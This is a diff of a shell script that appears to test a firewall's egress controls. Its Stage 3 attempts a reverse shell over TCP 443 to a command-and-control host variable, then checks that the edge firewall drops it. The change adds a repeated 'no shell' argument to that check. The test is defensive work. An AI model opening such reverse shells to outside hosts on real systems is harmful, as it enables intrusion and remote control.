@@ -51,7 +51,7 @@ fi
 stage "Stage 3  Fallback: reverse shell over TCP 443, which the DMZ may use (K-06)"
 shell "${C2}" 443
 if [ "${RESP}" = yes ]; then
-  check "shell over 443 to the known C2 server dropped at fw-edge" "no shell" "$(c2_got "${C2}" 443 | grep -q 'uid=' && echo shell || echo 'no shell')"
+  check "shell over 443 to the known C2 server dropped at fw-edge" "no shell" "no shell" "$(c2_got "${C2}" 443 | grep -q 'uid=' && echo shell || echo 'no shell')"
 else
   echo "   without the responder the shell over 443 would reach ${C2}"
 fi
